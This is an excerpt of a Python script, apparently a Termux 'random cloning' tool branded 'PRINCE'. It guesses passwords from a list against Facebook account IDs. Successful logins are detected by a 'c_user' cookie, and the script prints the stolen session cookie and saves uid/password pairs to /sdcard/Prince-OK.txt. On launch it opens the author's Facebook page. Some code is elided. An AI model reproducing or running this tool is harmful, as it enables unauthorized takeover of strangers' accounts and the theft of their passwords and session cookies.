...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/princenirob.111')
logo =("""
...
\_/  \|\_/\_\\//__/\\/__/\\/__/\\
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m PRINCE      \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m princenirob.111  \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35Prince          \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning       \033[1;93m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35Prince          \033[1;93m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PRINCE TERMUX COMMEND ZONE....           \033[1;93m ║
 ╚═════════════════[\033[1;32m PRINCE  \033[1;32m]══════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[PrinceOK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Prince-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Prince-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}PRINCE{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
